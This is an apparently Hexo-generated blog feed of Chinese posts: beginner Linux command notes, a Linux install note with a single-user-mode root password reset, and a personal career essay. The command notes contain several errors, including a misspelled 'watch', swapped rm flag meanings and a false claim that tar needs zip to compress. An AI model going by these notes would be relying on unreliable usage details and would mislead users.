（负载小于1为正常）</span><br></pre></td></tr></table></figure><ul><li><p>系统平均负载是指在特定时间间隔内运行队列中的平均进程数。</p></li><li><p>如果每个CPU内核的当前活动进程数不大于3的话，那么系统的性能是良好的。如果每个CPU内核的任务数大于5，那么这台机器的性能有严重问题。</p></li><li><p>如果你的linux主机是1个双核CPU的话，当Load Average 为6的时候说明机器已经被充分使用了。</p></li></ul><p>每秒钟刷新查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">witch -n 1 uptime</span><br></pre></td></tr></table></figure><h2 id="4、free"><a href="#4、free" class="headerlink" title="4、free"></a>4、free</h2><blockquote><p>用于查看当前系统内存使用情况</p></blockquote><p>free -m : 以MB为单位显示内存使用情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# free -m</span><br><span class="line">             total       used       free     shared    buffers     cached</span><br><span class="line">Mem:          1861        268       1593          0         16        136</span><br><span class="line">-/+ buffers/cache:        114       1747</span><br><span class="line">Swap:         3999          0       3999</span><br></pre></td></tr></table></figure><ul><li>total：内存总数</li><li>userd：当前已使用的内存数</li><li>free：空闲的内存数</li><li>shared：当前已经废弃不用</li><li>buffers：缓存内存数</li><li><p>cached：缓存内存数</p></li><li><p>内存 = used + free</p></li></ul><blockquote><p>(-buffers/cache) used内存数：Mem行中的 used – buffers – cached<br>(+buffers/cache) free内存数: Mem行中的 free + buffers + cached</p></blockquote><p>可见-buffers/cache反映的是被程序实实在在吃掉的内存，而+buffers/cache反映的是可以挪用的内存总数。</p><ul><li>swap:是指交换分区</li></ul><h2 id="5、who"><a href="#5、who" class="headerlink" title="5、who"></a>5、who</h2><blockquote><p>用于查看当前登录主机的用户情况</p></blockquote><h2 id="6、last"><a href="#6、last" class="headerlink" title="6、last"></a>6、last</h2><blockquote><p>用于查看所有系统的登录记录</p></blockquote><h2 id="7、history"><a href="#7、history" class="headerlink" title="7、history"></a>7、history</h2><blockquote><p>查看命令执行历史</p></blockquote><p>.bash_history</p><p>history -c</p><p>/etc/profile - HISSIZE</p><h1 id="工作目录切换命令"><a href="#工作目录切换命令" class="headerlink" title="工作目录切换命令"></a>工作目录切换命令</h1><h2 id="1、pwd"><a href="#1、pwd" class="headerlink" title="1、pwd"></a>1、pwd</h2><blockquote><p>显示当前所在的工作目录</p></blockquote><h2 id="2、cd"><a href="#2、cd" class="headerlink" title="2、cd"></a>2、cd</h2><blockquote><p>工作目录切换</p></blockquote><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-</td><td>切换到上一次的目录，如“cd-”</td></tr><tr><td>~</td><td>切换到家目录，如“cd ~”</td></tr><tr><td>~username</td><td>切换到其他用户的家目录</td></tr><tr><td>..</td><td>切换到上级目录，“cd ..”</td></tr></tbody></table><h2 id="3、ls"><a href="#3、ls" class="headerlink" title="3、ls"></a>3、ls</h2><blockquote><p>查看目录下的文件</p></blockquote><h1 id="文本编辑命令"><a href="#文本编辑命令" class="headerlink" title="文本编辑命令"></a>文本编辑命令</h1><h2 id="1、cat"><a href="#1、cat" class="headerlink" title="1、cat"></a>1、cat</h2><blockquote><p>查看纯文本文件</p></blockquote><p>-n/-b：显示行号</p><h2 id="2、more"><a href="#2、more" class="headerlink" title="2、more"></a>2、more</h2><blockquote><p>查看纯文本文件</p></blockquote><h2 id="3、head"><a href="#3、head" class="headerlink" title="3、head"></a>3、head</h2><blockquote><p>查看文本文件的前N行，</p></blockquote><p>默认显示前10行，-n：指定显示的行数</p><h2 id="4、tail"><a href="#4、tail" class="headerlink" title="4、tail"></a>4、tail</h2><blockquote><p>查看文本文件的后N行</p></blockquote><h2 id="5、od"><a href="#5、od" class="headerlink" title="5、od"></a>5、od</h2><blockquote><p>用于查看特殊格式的文件</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531493367917.jpg" alt="od"></p><h2 id="6、tr"><a href="#6、tr" class="headerlink" title="6、tr"></a>6、tr</h2><blockquote><p>用于转换文本文件中的字符</p></blockquote><p>先查看文本内容，后通过管道符将输出的文本给tr进行文本转换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# cat test.txt</span><br><span class="line">www.airs-sec.com</span><br><span class="line">linux</span><br><span class="line">[root@Lc ~]# cat test.txt | tr [a-z] [A-Z]</span><br><span class="line">WWW.AIRS-SEC.COM</span><br><span class="line">LINUX</span><br></pre></td></tr></table></figure><h2 id="7、wc"><a href="#7、wc" class="headerlink" title="7、wc"></a>7、wc</h2><blockquote><p>用于统计指定文本的行数、字数、字节数，</p></blockquote><p>wc [参数] 文本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# cat /etc/passwd | wc -l</span><br><span class="line">20</span><br></pre></td></tr></table></figure><h2 id="8、cut"><a href="#8、cut" class="headerlink" title="8、cut"></a>8、cut</h2><blockquote><p>用于通过列来提取文本字符，格式为：cut [参数] 文本</p></blockquote><ul><li>-d:指定分隔符</li><li>-f:指定显示的列数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# cat /etc/passwd | cut -d &quot;:&quot; -f1</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">lp</span><br><span class="line">sync</span><br><span class="line">shutdown</span><br><span class="line">halt</span><br><span class="line">mail</span><br><span class="line">uucp</span><br><span class="line">operator</span><br><span class="line">games</span><br><span class="line">gopher</span><br><span class="line">ftp</span><br><span class="line">nobody</span><br><span class="line">dbus</span><br><span class="line">vcsa</span><br><span class="line">saslauth</span><br><span class="line">postfix</span><br><span class="line">sshd</span><br></pre></td></tr></table></figure><h2 id="9、diff"><a href="#9、diff" class="headerlink" title="9、diff"></a>9、diff</h2><blockquote><p>比较两个文本文件的内容差异</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# diff test.txt test1.txt</span><br><span class="line">1c1</span><br><span class="line">&lt; www.airs-sec.com</span><br><span class="line">---</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> http://www.airs-sec.com</span></span><br><span class="line">2a3</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> windows</span></span><br><span class="line"></span><br><span class="line">[root@Lc ~]# diff --brief test.txt test1.txt</span><br><span class="line">Files test.txt and test1.txt differ</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# diff -c test.txt test1.txt</span><br><span class="line">*** test.txt    2018-04-05 15:12:08.356992993 +0800</span><br><span class="line">--- test1.txt   2018-04-05 15:22:40.555994033 +0800</span><br><span class="line">***************</span><br><span class="line">*** 1,2 ****</span><br><span class="line">! www.airs-sec.com</span><br><span class="line">  linux</span><br><span class="line">--- 1,3 ----</span><br><span class="line">! http://www.airs-sec.com</span><br><span class="line">  linux</span><br><span class="line">+ windows</span><br></pre></td></tr></table></figure><h1 id="文件目录管理命令"><a href="#文件目录管理命令" class="headerlink" title="文件目录管理命令"></a>文件目录管理命令</h1><h2 id="1、touch"><a href="#1、touch" class="headerlink" title="1、touch"></a>1、touch</h2><blockquote><p>创建空白时间与修改文件时间</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531493500385.jpg" alt="touch"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# ll</span><br><span class="line">总用量 32</span><br><span class="line">-rw-r--r--. 1 root root     0 4月   5 15:41 1.txt</span><br><span class="line">-rw-------. 1 root root  1206 1月  30 19:45 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 root root 13231 1月  30 19:45 install.log</span><br><span class="line">-rw-r--r--. 1 root root  3482 1月  30 19:44 install.log.syslog</span><br><span class="line">-rw-r--r--. 1 root root    38 4月   5 15:22 test1.txt</span><br><span class="line">-rw-r--r--. 1 root root    23 4月   5 15:12 test.txt</span><br><span class="line">[root@Lc ~]# touch -d &quot;2 day ago&quot; 1.txt</span><br><span class="line">[root@Lc ~]# ll</span><br><span class="line">总用量 32</span><br><span class="line">-rw-r--r--. 1 root root     0 4月   3 18:03 1.txt</span><br><span class="line">-rw-------. 1 root root  1206 1月  30 19:45 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 root root 13231 1月  30 19:45 install.log</span><br><span class="line">-rw-r--r--. 1 root root  3482 1月  30 19:44 install.log.syslog</span><br><span class="line">-rw-r--r--. 1 root root    38 4月   5 15:22 test1.txt</span><br><span class="line">-rw-r--r--. 1 root root    23 4月   5 15:12 test.txt</span><br></pre></td></tr></table></figure><h2 id="2、mkdir"><a href="#2、mkdir" class="headerlink" title="2、mkdir"></a>2、mkdir</h2><blockquote><p>创建目录</p></blockquote><ul><li>-m=MODE 指定目录的权限</li><li>-p：创建多层目录</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# mkdir dir</span><br><span class="line">[root@Lc ~]# ll</span><br><span class="line">总用量 36</span><br><span class="line">-rw-r--r--. 1 root root     0 4月   3 18:03 1.txt</span><br><span class="line">-rw-------. 1 root root  1206 1月  30 19:45 anaconda-ks.cfg</span><br><span class="line">drwxr-xr-x. 2 root root  4096 4月   5 18:15 dir</span><br><span class="line">-rw-r--r--. 1 root root 13231 1月  30 19:45 install.log</span><br><span class="line">-rw-r--r--. 1 root root  3482 1月  30 19:44 install.log.syslog</span><br><span class="line">-rw-r--r--. 1 root root    38 4月   5 15:22 test1.txt</span><br><span class="line">-rw-r--r--. 1 root root    23 4月   5 15:12 test.txt</span><br><span class="line">[root@Lc ~]# mkdir -m 777 dir1</span><br><span class="line">[root@Lc ~]# ll</span><br><span class="line">总用量 40</span><br><span class="line">-rw-r--r--. 1 root root     0 4月   3 18:03 1.txt</span><br><span class="line">-rw-------. 1 root root  1206 1月  30 19:45 anaconda-ks.cfg</span><br><span class="line">drwxr-xr-x. 2 root root  4096 4月   5 18:15 dir</span><br><span class="line">drwxrwxrwx. 2 root root  4096 4月   5 18:15 dir1</span><br><span class="line">-rw-r--r--. 1 root root 13231 1月  30 19:45 install.log</span><br><span class="line">-rw-r--r--. 1 root root  3482 1月  30 19:44 install.log.syslog</span><br><span class="line">-rw-r--r--. 1 root root    38 4月   5 15:22 test1.txt</span><br><span class="line">-rw-r--r--. 1 root root    23 4月   5 15:12 test.txt</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# mkdir -p dir3/&#123;test1,test2&#125;</span><br><span class="line">[root@Lc ~]# ll dir3</span><br><span class="line">总用量 8</span><br><span class="line">drwxr-xr-x. 2 root root 4096 4月   5 18:16 test1</span><br><span class="line">drwxr-xr-x. 2 root root 4096 4月   5 18:16 test2</span><br></pre></td></tr></table></figure><h2 id="3、cp"><a href="#3、cp" class="headerlink" title="3、cp"></a>3、cp</h2><blockquote><p>复制文件或目录</p></blockquote><p><strong>cp [参数] 源文件 目标文件</strong></p><ul><li>-p：保留原始文件的属性</li><li>-r：递归复制</li></ul><h2 id="4、mv"><a href="#4、mv" class="headerlink" title="4、mv"></a>4、mv</h2><blockquote><p>移动文件或重命名</p></blockquote><h2 id="5、rm"><a href="#5、rm" class="headerlink" title="5、rm"></a>5、rm</h2><blockquote><p>删除文件或目录</p></blockquote><ul><li>-r：忽略警告</li><li>-f：删除目录</li></ul><h2 id="6、dd"><a href="#6、dd" class="headerlink" title="6、dd"></a>6、dd</h2><blockquote><p>用于复制文件并对原文件的内容进行转换和格式化处理。</p></blockquote><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>if</td><td>输入文件的名称</td></tr><tr><td>of</td><td>输出文件的名称</td></tr><tr><td>bs</td><td>设置每个“块”的大小</td></tr><tr><td>count</td><td>设置要拷贝“块”的个数</td></tr></tbody></table><blockquote><p>案例：</p></blockquote><p>生成一个100M的空白文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# dd if=/dev/zero of=test_dd bs=100M count=1</span><br><span class="line">记录了1+0 的读入</span><br><span class="line">记录了1+0 的写出</span><br><span class="line">104857600字节(105 MB)已复制，1.38478 秒，75.7 MB/秒</span><br><span class="line">[root@Lc ~]# ll test_dd</span><br><span class="line">-rw-r--r--. 1 root root 104857600 4月   6 01:38 test_dd</span><br><span class="line">[root@Lc ~]# ll -h test_dd</span><br><span class="line">-rw-r--r--. 1 root root 100M 4月   6 01:38 test_dd</span><br></pre></td></tr></table></figure><p><strong>注：</strong></p><p>/dev/zero 是一个字符设备，会不断返回0值字节（\0）。</p><h1 id="用户与组管理命令"><a href="#用户与组管理命令" class="headerlink" title="用户与组管理命令"></a>用户与组管理命令</h1><h2 id="1、useradd"><a href="#1、useradd" class="headerlink" title="1、useradd"></a>1、useradd</h2><blockquote><p>用于创建新用户</p></blockquote><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-d</td><td>指定用户的家目录</td></tr><tr><td>-e</td><td>指定此用户的使用期限，格式：YYYY-MM-DD</td></tr><tr><td>-g</td><td>指定一个用户组，此组必须存在</td></tr><tr><td>-s</td><td>指定默认的shell</td></tr><tr><td>-u</td><td>指定用户的UID</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# useradd -d /home/testuser -s /sbin/nologin -u 8888 test</span><br><span class="line">[root@Lc ~]# id test</span><br><span class="line">uid=8888(test) gid=8888(test) 组=8888(test)</span><br></pre></td></tr></table></figure><h2 id="2、passwd"><a href="#2、passwd" class="headerlink" title="2、passwd"></a>2、passwd</h2><blockquote><p> 设置/修改用户的密码</p></blockquote><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-l</td><td>锁定用户禁止登陆</td></tr><tr><td>-u</td><td>解除锁定，允许用户登录</td></tr><tr><td>–stdin</td><td>允许从标准输入修改密码</td></tr><tr><td>-e</td><td>强制用户下次登录时修改密码</td></tr><tr><td>-S</td><td>显示登录用户的密码状态</td></tr><tr><td>-d</td><td>使账号无密码</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@Lc ~]# passwd -S root</span><br><span class="line">root PS 2018-01-30 0 99999 7 -1 (密码已设置，使用 SHA512 加密。)</span><br><span class="line"></span><br><span class="line"># 如果未设置密码，未状态如下</span><br><span class="line"></span><br><span class="line">[root@Lc ~]# passwd -S test</span><br><span class="line">test LK 2018-04-05 0 99999 7 -1 (密码已被锁定。)</span><br></pre></td></tr></table></figure><h2 id="3、userdel"><a href="#3、userdel" class="headerlink" title="3、userdel"></a>3、userdel</h2><blockquote><p>删除用户</p></blockquote><ul><li>-f：强制删除用户，家目录及文件</li><li>-d：删除用户，家目录及文件</li></ul><h2 id="4、usermod"><a href="#4、usermod" class="headerlink" title="4、usermod"></a>4、usermod</h2><blockquote><p>修改用户的属性</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531493919611.jpg" alt="usermod"></p><h2 id="5、groupadd"><a href="#5、groupadd" class="headerlink" title="5、groupadd"></a>5、groupadd</h2><blockquote><p>创建群组</p></blockquote><h1 id="打包压缩文件命令"><a href="#打包压缩文件命令" class="headerlink" title="打包压缩文件命令"></a>打包压缩文件命令</h1><h2 id="1、tar"><a href="#1、tar" class="headerlink" title="1、tar"></a>1、tar</h2><blockquote><p>用于对文件打包或压缩</p></blockquote><p>1.1、打包并压缩文件 tar -czvf 压缩包名.tar.gz 文件名<br>1.2、解压并展开压缩包 tar -xzvf 压缩包名.tar.gz</p><p>tar命令只是一个打包命令，本身不对文件进行压缩，进行压缩要结合<code>zip</code>命令。</p><h1 id="文件查询命令"><a href="#文件查询命令" class="headerlink" title="文件查询命令"></a>文件查询命令</h1><h2 id="1、grep"><a href="#1、grep" class="headerlink" title="1、grep"></a>1、grep</h2><blockquote><p>对文本进行搜索</p></blockquote><h2 id="2、find"><a href="#2、find" class="headerlink" title="2、find"></a>2、find</h2><blockquote><p>用于查找文件</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;用户不能直接操作底层，通过shell可以达到控制底层。应用程序处于最上层，和用户最近的一层，应用程序和内核之间的就是系统调用接口（shell）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/36142.jpg&quot; alt=&quot;linux就该这么学&quot; title=&quot;inux就该这么学&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="阅读" scheme="http://airs-sec.com/categories/%E9%98%85%E8%AF%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>linux就该这么学-1</title>
    <link href="http://airs-sec.com/2018/07/12/linux%E5%B0%B1%E8%AF%A5%E8%BF%99%E4%B9%88%E5%AD%A6-1/"/>
    <id>http://airs-sec.com/2018/07/12/linux就该这么学-1/</id>
    <published>2018-07-12T12:59:20.000Z</published>
    <updated>2018-07-12T13:14:19.780Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文档参考《linux就该这么学》中的知识内容与体系，看了一遍顺便做了下笔记，笔记相对简单。</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/07-30-32-K61hPmD.jpg" alt="enter description here" title="07-30-32-K61hPmD"></p><a id="more"></a><h1 id="00-概述"><a href="#00-概述" class="headerlink" title="00 概述"></a>00 概述</h1><p><strong>开源软件的特性</strong></p><ul><li>使用自由</li><li>修改自由</li><li>重新发布自由</li><li>创建衍生品自由</li></ul><ul><li>Linus Torvalds-&gt;1991.10</li></ul><h1 id="01-linux系统的安装"><a href="#01-linux系统的安装" class="headerlink" title="01 linux系统的安装"></a>01 linux系统的安装</h1><blockquote><p>linux的安装比较简单，同时，也可以在物理计算机上安装。</p></blockquote><ul><li><p>windows虚拟机安装</p><ul><li><p>tools</p><ul><li>vmware workstation xx</li><li>redhat 7.0</li><li>hash 1.0.4</li></ul></li></ul></li><li><p>linux虚拟机安装-KVM</p><ul><li>首先，安装kvm软件</li><li>配置ip地址</li><li>配置虚拟机参数</li><li>配置VNC服务</li></ul></li></ul><h2 id="重置Root用户密码"><a href="#重置Root用户密码" class="headerlink" title="重置Root用户密码"></a>重置Root用户密码</h2><p>开机进入这个页面，按“e”</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531400611894.jpg" alt="enter description here"></p><p>选中第二个kernel开头的一行，按“e”</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531400634779.jpg" alt="enter description here"></p><p>在末尾加一个“single”，回车，返回上一页</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531400648480.jpg" alt="enter description here"></p><p>按“b”重新启动，进入后直接使用“passwd”，修改root用户的密码，之后，重启即可。</p><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><ul><li>rpm</li></ul><p>redhat package manage，可以在本地配置rpm源</p><ul><li>yum</li></ul><blockquote><p>yum仓库较rpm来讲，更加方便快捷。</p></blockquote><blockquote><p> yum仓库的配置文件均以.repo结尾并存放在/etc/yum.repos.d/目录下。</p></blockquote><p> <img src="http://obgutsg63.bkt.clouddn.com/blog/1531400689589.jpg" alt="enter description here"></p><p> centos6.5的yum源配置文件如下,163的源：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> [base]</span><br><span class="line">name=CentOS-$releasever - Base - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/</span><br><span class="line">http://mirrors.aliyuncs.com/centos/$releasever/os/$basearch/</span><br><span class="line">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-6</span><br></pre></td></tr></table></figure><p><a href="http://mirrors.ustc.edu.cn/help/centos.html" target="_blank" rel="noopener">更换清华大学的yum源-CentOS 源使用帮助</a></p><ul><li>name：源的名称，可自定义</li><li>baseurl：源地址，提供方式有ftp(ftp://)，HTTP(http://)，本地(file://)</li><li>gepcheck：设置此源的校验文件，1为校验，0为不校验</li><li>gpgkey：校验时的公钥地址</li></ul><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1531400768984.jpg" alt="enter description here"></p><p>我就直接贴图了，<code>-_-|</code>。</p><ul><li>配置yum源的另一种方式：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release</span><br></pre></td></tr></table></figure><blockquote><p>如果你用的是Ubuntu和debian类的linux操作系统，那么安装软件使用apt-get命令。</p></blockquote><blockquote><p>之后，这些命令在之后会单独拿出来写独立的一篇。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文档参考《linux就该这么学》中的知识内容与体系，看了一遍顺便做了下笔记，笔记相对简单。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/07-30-32-K61hPmD.jpg&quot; alt=&quot;enter description here&quot; title=&quot;07-30-32-K61hPmD&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="阅读" scheme="http://airs-sec.com/categories/%E9%98%85%E8%AF%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>突然间失落</title>
    <link href="http://airs-sec.com/2018/07/10/%E7%AA%81%E7%84%B6%E9%97%B4%E5%A4%B1%E8%90%BD/"/>
    <id>http://airs-sec.com/2018/07/10/突然间失落/</id>
    <published>2018-07-10T13:15:10.000Z</published>
    <updated>2018-07-10T13:59:32.708Z</updated>
    
    <content type="html"><![CDATA[<p>博客刚迁移，晚上，本打算写篇技术博客，想来想去，都不清楚写啥内容，做安全一路走来也这么久了，回想下过去，发现都是班门弄斧，学的都是些皮毛，写的很多博客，内容深度都是比较浅显，没什么比较深层次的东西，这种不精通的文章，往往发表出去也是没人看，所以总在写与不写中纠结，本来弄博客只是打算自己做下笔记，但与自己学习上比的话，往往感觉欠缺了什么。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/QQ%E5%9B%BE%E7%89%8720180710211527.png" alt="enter description here" title="活着你就得有料"></p><a id="more"></a><hr><p>以前看《读大学，究竟读什么》，里面有一句话印象特别深，“不可一业不专，不可只专一业”，现在，我感觉自己还是一业不专，在人生的兜兜转转中，已经过了这些年了，越感觉学习上力不从心了，学，学了很多，而没有精度。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/006qzLBtgy1flt1a28go4j30sg0lc76a.jpg" alt="enter description here" title="孔枝泳《熔炉》"></p><p>比如，编程，从大学都已近开始学了，期间学了C、汇编、html、css、js、php，但已过这些年，对这些东西还不是很熟练，前端是早就不弄了，php做了一门脚本语言，且在平常的安全测试中，也是接触的比较多的，也不是很熟练，编程只要多练其实就可以提升编程能力的，也正因为没有多练，才如此不熟练。</p><p><code>正因为学的杂，所以学的乱。</code></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Screenshot_2015-06-19-22-22-09_1434723752138.jpg" alt="enter description here" title="保罗.格雷厄姆"></p><p>也就在工作之后，那时还不清楚有安全这个行业，但是有网络基础，陪同学去面试了，本来之前老师的关系，去一家当地比较大的公司，但由于种种关系，刚好也去同学面试的那家公司看看，面试过来，提出的工资是比较低的，当时，咨询过老师之后，本身还在读书，可以去小公司学点技术也是可以的，在老师的劝导之后，也就入职了那家公司，也就是现在的这家公司。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Screenshot_2015-09-13-18-23-05_1442139838704.jpg" alt="enter description here" title="保罗.格雷厄姆"></p><p>想想，在这也呆了有两三年了，很多东西都是懵懵懂懂过来的，也没去计较工资的高低，但随着身边同事的不断离开，自己往往想的很多，其实，我是那种呆了一个地方就会一直待下去的那种，懒得跳来跳去，自己也是这种性格，也不清楚，是不是这种性格吃了亏，很多东西以为忍忍就过去了，在本身的不断平衡当中，继续做着有很多不顺心的事。</p><p>就像《黑客与画家》当中说的，“如果你工作的不辛苦，你可能正在浪费你的时间”，在没有挑战性的工作面前，一切工作都是像流水线一样，完成了就好了，没有激情，也没有任何有创造性的东西。</p><p>我不是大牛，只是个菜鸟。</p><p>也很想在工作中能有一个大牛带着我学习，能在技术上有个领头人，由于公司的关系，公司的没了西墙补东墙的模式，并不去容纳大牛，而招聘学校中还未毕业的实习生，很多刚来的实习生，也不是专业的安全人员，首先，得先较一些简单的测试工具怎么用，一步步去教，带人，其实是很累的，况且，学了几个月，由于各种关系，人又跑了，又来一批实习生，又得一步步教，人又跑了，在这循环当中。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Screenshot_2015-09-17-16-59-57_1442480425230.jpg" alt="enter description here" title="人有各异"></p><p>很多时候，我在想，我这样做的意义何在。</p><p>没有开发能力，也不想去开发什么东西，一点琐事都搞了那么多年，还是没有弄明白。</p><p>也许，等我离开的时候，才是我成熟的时候。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Screenshot_2015-10-03-14-26-09_1443853590032_1443853619328.jpg" alt="enter description here" title="you Rw"></p><p>但我现在还不想这样就去放弃，我觉得还是要做点什么，不管在技术、管理、个人生活方面，人生那么长，总有些不郁闷的时候，不愉快的时候，就像说了上述这么多，命运还是把握在自己手中，没有开发能力，就锻炼自己的开发能力，虽然不一定需要精通，养成一门精通已经很不错了。</p><p><code>接下来的岁月，放松心态，砥砺向前。</code></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Screenshot_2015-10-10-06-43-42_1444471237880.jpg" alt="enter description here" title="人生"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;博客刚迁移，晚上，本打算写篇技术博客，想来想去，都不清楚写啥内容，做安全一路走来也这么久了，回想下过去，发现都是班门弄斧，学的都是些皮毛，写的很多博客，内容深度都是比较浅显，没什么比较深层次的东西，这种不精通的文章，往往发表出去也是没人看，所以总在写与不写中纠结，本来弄博客只是打算自己做下笔记，但与自己学习上比的话，往往感觉欠缺了什么。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/QQ%E5%9B%BE%E7%89%8720180710211527.png&quot; alt=&quot;enter description here&quot; title=&quot;活着你就得有料&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://airs-sec.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://airs-sec.com/2018/07/09/hello-world/"/>
    <id>http://airs-sec.com/2018/07/09/hello-world/</id>
    <published>2018-07-09T05:27:48.605Z</published>
    <updated>2018-07-09T06:56:23.246Z</updated>
    
